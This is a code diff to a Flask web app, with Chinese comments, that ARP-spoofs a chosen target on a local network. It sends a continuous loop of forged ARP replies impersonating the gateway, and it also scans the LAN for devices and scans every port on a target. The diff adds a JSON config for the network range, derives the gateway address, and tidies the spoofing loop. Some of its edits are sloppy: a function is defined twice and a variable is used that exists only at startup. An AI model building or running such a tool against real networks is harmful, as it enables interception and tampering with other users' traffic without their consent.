@@ -1,9 +1,12 @@
+import json
+import os
 from flask import Flask, render_template, request, jsonify
 import threading
 import socket
 from scapy.all import ARP, Ether, sendp, srp1, get_if_hwaddr, conf
 import time
 from concurrent.futures import ThreadPoolExecutor
+import logging
 
 app = Flask(__name__)
 
@@ -11,7 +14,30 @@ app = Flask(__name__)
 arp_spoofing_thread = None
 arp_spoofing_active = False
 
-import logging
+# 配置文件路径
+CONFIG_FILE = 'config.json'
+
+# 默认配置内容
+DEFAULT_CONFIG = {
+    "network_range": "192.168.1.0/24"
+}
+
+
+# 初始化配置文件
+def initialize_config():
+    if not os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(DEFAULT_CONFIG, f, indent=4)
+        print(f"{CONFIG_FILE} already created，using default configuration。")
+    else:
+        print(f"{CONFIG_FILE} already existed. using existing configuration")
+
+
+# 加载配置文件
+def load_config():
+    with open(CONFIG_FILE, 'r') as f:
+        return json.load(f)
+
 
 # 配置日志
 logging.basicConfig(
@@ -19,6 +45,12 @@ logging.basicConfig(
     level=logging.INFO,  # 设置日志级别
     datefmt='%Y-%m-%d %H:%M:%S'  # 时间格式
 )
+
+
+# 加载配置文件
+def load_config():
+    with open('config.json', 'r') as f:
+        return json.load(f)
 
 
 # 获取本机 MAC 地址
@@ -45,23 +77,28 @@ def get_default_interface():
 # 运行 ARP 欺骗的函数
 def arp_spoof(target_ip, target_mac, gateway_ip, local_mac, interface):
     global arp_spoofing_active
+
+    # 构建带有以太网帧的 ARP 响应包
+    arp_response = (
+            Ether(src=local_mac, dst=target_mac) /  # 指定源和目标的 MAC 地址
+            ARP(
+                op=2,  # ARP 回复
+                psrc=gateway_ip,  # 伪装的源 IP 地址（网关）
+                pdst=target_ip,  # 目标设备的 IP 地址
+                hwsrc=local_mac,  # 本机 MAC 地址
+                hwdst=target_mac  # 目标设备的 MAC 地址
+            )
+    )
+
     while arp_spoofing_active:
-        # 构建带有以太网帧的 ARP 响应包
-        arp_response = (
-                Ether(src=local_mac, dst=target_mac) /  # 指定源和目标的 MAC 地址
-                ARP(
-                    op=2,  # ARP 回复
-                    psrc=gateway_ip,  # 伪装的源 IP 地址（网关）
-                    pdst=target_ip,  # 目标设备的 IP 地址
-                    hwsrc=local_mac,  # 本机 MAC 地址
-                    hwdst=target_mac  # 目标设备的 MAC 地址
-                )
-        )
+        start_time = time.time()  # 记录开始时间
 
         # 发送伪造的 ARP 响应包
         sendp(arp_response, iface=interface, verbose=False)
-        logging.info("Spoofing ARP response")
+        # logging.info("Spoofing ARP response")
         # time.sleep(2)
+        # elapsed_time = time.time() - start_time
+        # logging.info(f"Time elapsed since start: {elapsed_time:.4f} seconds")
 
 
 # 单个 IP 的扫描任务
@@ -87,9 +124,10 @@ def scan_ip(ip):
 
 
 # 多线程扫描网络设备
-def scan_network(network="192.168.50.0/24"):
-    start_time = time.time()  # 记录开始时间
+def scan_network(network):
 
+    start_time = time.time()  # 记录开始时间
+    logging.info(f"Network scan is in {network} .")
     # 提取网络 IP 前缀
     ip_prefix = network.rsplit('.', 1)[0]
     ip_range = [f"{ip_prefix}.{i}" for i in range(1, 255)]  # 生成 IP 地址范围
@@ -102,6 +140,7 @@ def scan_network(network="192.168.50.0/24"):
     end_time = time.time()  # 记录结束时间
     elapsed_time = end_time - start_time  # 计算扫描用时
     logging.info(f"Network scan completed in {elapsed_time:.2f} seconds.")  # 打印用时
+    # logging.info(f"devices: {devices} .")
 
     return devices
 
@@ -109,6 +148,7 @@ def scan_network(network="192.168.50.0/24"):
 scan_progress = 0
 scan_total_ports = 65535
 scan_lock = threading.Lock()
+
 
 # 单个端口扫描任务
 def scan_port(ip, port):
@@ -170,7 +210,6 @@ def control():
 
         # 获取输入的目标 IP、目标 MAC 和网关 IP
         target_ip = request.form.get('target_ip')
-        gateway_ip = request.form.get('gateway_ip')
         interface = get_default_interface()
         local_mac = get_local_mac(interface)
         target_mac = get_mac(target_ip)
@@ -202,7 +241,7 @@ def control():
 @app.route('/api/devices')
 def api_devices():
     # 扫描网络设备并返回 JSON 格式数据
-    network_devices = scan_network()
+    network_devices = scan_network(network)
     return jsonify(network_devices)
 
 
@@ -215,4 +254,13 @@ def scan_progress_status():
 
 
 if __name__ == '__main__':
+    # 在应用启动时初始化配置
+    initialize_config()
+    config = load_config()
+    network = config.get("network_range", "192.168.1.0/24")  # 默认网络范围
+    network_ip = network.split('/')[0]
+    ip_parts = network_ip.split('.')
+    ip_parts[-1] = '1'
+    gateway_ip = '.'.join(ip_parts)
+
     app.run(host='0.0.0.0', port=5000)
